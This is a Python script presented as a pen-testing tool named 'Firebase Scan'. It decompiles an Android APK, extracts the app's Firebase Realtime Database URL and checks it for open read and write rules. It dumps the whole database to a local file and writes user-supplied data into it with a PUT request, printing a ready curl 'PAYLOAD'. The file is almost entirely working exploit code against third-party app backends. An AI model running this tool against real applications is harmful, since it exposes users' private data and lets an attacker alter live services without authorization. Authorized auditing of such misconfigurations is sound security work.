import subprocess
import os.path
from tqdm import tqdm
import time
import xml.etree.ElementTree as ET
import requests
import json
import argparse

banner = "\n"\
"           _____ _          _                    _____                 \n"\
"           |  _|(_)        | |                  /  ___|                \n"\
"           | |_  _ _ __ ___| |__   __ _ ___  ___\ `--.  ___ __ _ _ ___ \n"\
"           |  _|| | '__/ _ \ '_ \ / _` / __|/ _ \`--. \/ __/ _` | '_  \ \n"\
"           | |  | | | |  __/ |_) | (_| \__ \  __/\__/ / (_| (_| | | | |\n"\
"           \_|  |_|_|  \___|_.__/ \__,_|___/\___\____/ \___\__,_|_| |_|\n"\
"\n"\
"                                  by: IAMABEAR                         \n\n"

parser = argparse.ArgumentParser(prog='Firebase Scan', 
                                usage='python firebase-scan.py [-h] [-y] [-d] apk-file', 
                                epilog='Example: python firebase-scan.py example.apk', 
                                description='A pen-testing tool to automatically exploiting Firebase DB vulnerability in the android application.')
parser.add_argument('apkfile', metavar='apk-file', help='name of the apk file')
parser.add_argument('-y', action='store_true', help='yes to all selection')
parser.add_argument('-d', '--dump', action='store_true', help='dump database')

def isExist(filename):
    return os.path.exists(filename)

def decodeAPK(filename):
    cmd = subprocess.Popen(['java', '-jar', 'apktool_2.5.0.jar', '-f', 'd', filename], stdout=subprocess.PIPE)
    pbar = tqdm(range (100), desc=" [-] Analyzing APK", ncols=80)
    for i in pbar:
        time.sleep(0.01)
        if (i == 50):
            while (cmd.stdout.readline().decode("utf-8")):
                time.sleep(0.01)
        if (i == 99):
            pbar.set_description(" [+] Analyzing APK")

def getFirebaseURL(dir):
    xmlfile = "./" + dir[:-4] + "/res/values/strings.xml"
    tree = ET.parse(xmlfile)
    root = tree.getroot()
    FirebaseURL = "N/A"

    for i in root.findall("./string/[@name='firebase_database_url']"):
        FirebaseURL = i.text
        if (FirebaseURL[-1:] == "/"):
            FirebaseURL = FirebaseURL[:-1]

    pbar = tqdm(range (100), desc=" [-] Finding URL", ncols=80)
    for i in pbar:
        time.sleep(0.01)
        if (i == 99):
            pbar.set_description(" [+] Finding URL")

    return FirebaseURL

def dumpDB(apkfile, url):
    response = requests.get(url + "/.json")
    dumpfile = apkfile + '.json'
    pbar = tqdm(range (100), desc=" [-] Dump DB", ncols=80)
    for i in pbar:
        time.sleep(0.01)
        if (i == 99):
            with open(dumpfile, "w") as outfile:
                outfile.write(json.dumps(response.json(), indent = 4))
            pbar.set_description(" [+] Dump DB")
    print("Database dumped to " + dumpfile)

def CheckRead(url):
    response = requests.get(url + "/.json")

    pbar = tqdm(range (100), desc=" [-] Testing", ncols=80)
    for i in pbar:
        time.sleep(0.01)
        if (i == 99):
            pbar.set_description(" [+] Done")

    if (response.json() == {'error': 'Permission denied'}):
        return False
    return True

def CheckWrite(url, filename, data):
    new_file = url + "/" + filename + ".json"
    new_data = {'Exploit': 'successfull', 'Data': data}

    response = requests.put(new_file, json=new_data)

    pbar = tqdm(range (100), desc=" [-] Testing", ncols=80)
    for i in pbar:
        time.sleep(0.01)
        if (i == 99):
            pbar.set_description(" [+] Done")
        
    if (response.status_code == 200):
        return True
    else:
        return False

def main():
    print(banner)
    args = parser.parse_args()
    apkfile = args.apkfile

    print("APK file: " + apkfile)
    if (isExist(apkfile[:-4]) == True and args.y == False):
        print("\nThis file has been decoded, decode " + apkfile + " again? (Y/n)  ", end='')
        c = input()
        if (c == 'Y' or c == 'y' or c == ''):
            decodeAPK(apkfile)
    else:
        decodeAPK(apkfile)

    print("\nFinding Firebase Realtime Database URL:")
    furl = getFirebaseURL(apkfile)

    if (furl == "N/A"):
        print("\nThis application does not using Firebase DB.")
        return 0

    print("\nFirebase DB URL:", furl)

    print("\nChecking for read permission:")
    if (CheckRead(furl)):
        print("This URL has a configuration error on reading permission.")
        print(" [+] PAYLOAD: ", furl + "/.json")
        
        if (args.y):
            c = 'y'
            print("\nDump the database:")
        else:
            print("\nDump the database? (Y/n)  ", end='')
            c = input()

        if (c == 'Y' or c == 'y' or c == ''):
            dumpDB(apkfile[:-4], furl)

        if (args.y):
            c = 'y'
            print("\nChecking for write permission:")
        else:
            print("\nTesting for writing permission? (Y/n)  ", end='')
            c = input()
        
        if (c == 'Y' or c == 'y' or c == ''):
            print(" [+] Filename: ", end='')
            filename = input()
            print(" [+] Data    : ", end='')
            data = input()

            if (CheckWrite(furl, filename, data)):
                print("\nThis URL has a configuration error on writing permission. Ctrl + Click on the link in the payload to check.")
                url = furl + "/" + filename + ".json"
                payload = 'curl -X PUT -d \'{\"Exploit\": \"successfull\", \"Data\": \"' + data + '\"}\' ' + '\"' + url + '\"'
                print(" [+] PAYLOAD: ", payload)
            else:
                print("This URL has no configuration error on writing permission.")
        else:
            return 0
    else:
        print("This URL has no configuration error on reading permission.")
    return 0

if __name__ == "__main__":
    main()